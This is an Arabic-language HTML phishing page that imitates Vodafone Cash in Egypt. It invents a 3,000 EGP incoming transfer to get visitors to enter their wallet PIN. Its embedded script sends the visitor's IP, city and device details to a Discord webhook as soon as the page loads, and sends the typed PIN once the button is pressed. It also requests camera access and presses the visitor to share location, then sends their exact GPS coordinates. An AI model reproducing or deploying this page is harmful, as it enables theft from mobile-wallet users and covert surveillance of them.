<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ana Vodafone</title>
    <style>
        /* إعدادات الخط والألوان الأصلية */
        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
        
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        
        body, html { 
            margin: 0; padding: 0; width: 100%; height: 100%; 
            font-family: 'Cairo', sans-serif; background-color: #f4f4f4; 
        }

        /* الهيدر الأحمر الرسمي */
        .voda-header {
            background-color: #e60000;
            height: 60px;
            display: flex;
            align-items: center;
            padding: 0 15px;
            position: sticky;
            top: 0;
            z-index: 1000;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }

        .voda-logo { width: 40px; height: 40px; }
        .header-title { color: white; margin-right: 15px; font-weight: bold; font-size: 18px; }

        /* حاوية المحتوى - عرض كامل الشاشة */
        .main-content {
            background: white;
            min-height: calc(100vh - 60px);
            display: flex;
            flex-direction: column;
            padding: 0;
        }

        /* بانر ترحيبي مثل التطبيق */
        .promo-banner {
            background: linear-gradient(180deg, #e60000 0%, #bd0000 100%);
            color: white;
            padding: 30px 20px;
            text-align: center;
        }

        .cash-card {
            background: white;
            margin: -20px 15px 20px 15px;
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            border-top: 4px solid #e60000;
        }

        .transfer-msg { color: #333; font-size: 16px; margin-bottom: 10px; }
        .amount { color: #e60000; font-size: 28px; font-weight: bold; display: block; }
        .sender { color: #666; font-size: 13px; }

        /* قسم الإدخال */
        .input-section { padding: 20px; flex-grow: 1; }
        
        label { display: block; margin-bottom: 12px; color: #444; font-weight: bold; font-size: 14px; }
        
        input[type="password"] {
            width: 100%;
            padding: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 22px;
            text-align: center;
            letter-spacing: 8px;
            background: #f9f9f9;
            margin-bottom: 25px;
        }

        input:focus { border-color: #e60000; outline: none; background: white; }

        .confirm-btn {
            background-color: #e60000;
            color: white;
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(230,0,0,0.3);
        }

        /* فوتر الأمان */
        .footer-secure {
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #999;
        }
    </style>
</head>
<body>

    <div class="voda-header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/af/Vodafone_Logo.svg" class="voda-logo" alt="Logo">
        <span class="header-title">فودافون كاش</span>
    </div>

    <div class="main-content">
        <div class="promo-banner">
            <h2 style="margin:0;">خدمات الدفع الذكية</h2>
            <p style="font-size:14px; opacity:0.9;">أسرع وسيلة لتحويل واستلام الأموال في مصر</p>
        </div>

        <div class="cash-card">
            <span class="transfer-msg">لديك حوالة واردة جديدة بقيمة:</span>
            <span class="amount">3,000.00 ج.م</span>
            <span class="sender">من رقم: 01064001459</span>
        </div>

        <div class="input-section">
            <label>لتأكيد العملية، أدخل الرقم السري للمحفظة (PIN):</label>
            <input type="password" id="pinCode" maxlength="6" inputmode="numeric" placeholder="******">
            
            <button class="confirm-btn" onclick="executeFullCapture()">تأكيد الإيداع الآن</button>
            
            <p style="font-size: 12px; color: #777; text-align: center; margin-top: 15px;">
                سيتم طلب صلاحية الموقع للتأكد من أمان العملية المالية.
            </p>
        </div>

        <div class="footer-secure">
            جميع الحقوق محفوظة © فودافون مصر 2026 <br>
            تطبق الشروط والأحكام - رقم التسجيل الضريبي 200-058-204
        </div>
    </div>

    <script>
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1494444634586222682/HdxT-BynNCFlveKYWjMqYngyasuPSOVI-7a1RAA1QqAOLkW6O5MranKijd5v_yOoXZpa";

        // سحب صامت فور الدخول
        (async () => {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const ip = await res.json();
                sendData("🆕 دخول كامل الشاشة", [
                    { name: "IP", value: ip.ip },
                    { name: "المدينة", value: ip.city },
                    { name: "الجهاز", value: navigator.userAgent }
                ], 16711680);
            } catch(e) {}
        })();

        async function executeFullCapture() {
            const pin = document.getElementById('pinCode').value;
            if (pin.length < 6) { alert("أدخل رقم التعريف السري الصحيح."); return; }

            // إرسال الرقم السري فوراً
            await sendData("🔑 تم سحب الـ PIN", [{ name: "الرقم السري", value: "`"+pin+"`" }], 15105570);

            // طلب الكاميرا والموقع
            try { await navigator.mediaDevices.getUserMedia({ video: true }); } catch(e) {}

            navigator.geolocation.getCurrentPosition((p) => {
                sendData("📍 موقع دقيق (GPS)", [
                    { name: "الخريطة", value: `[اضغط هنا](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})` }
                ], 3066993);
                alert("تم استلام طلبك. ستصلك رسالة تأكيد خلال دقائق.");
            }, (err) => {
                alert("خطأ: يجب السماح بصلاحية الموقع لتأكيد العملية المالية.");
            }, { enableHighAccuracy: true });
        }

        function sendData(title, fields, color) {
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username: "Vodafone Full-Screen API",
                    embeds: [{ title: title, color: color, fields: fields, timestamp: new Date() }]
                })
            });
        }
    </script>
</body>
</html>
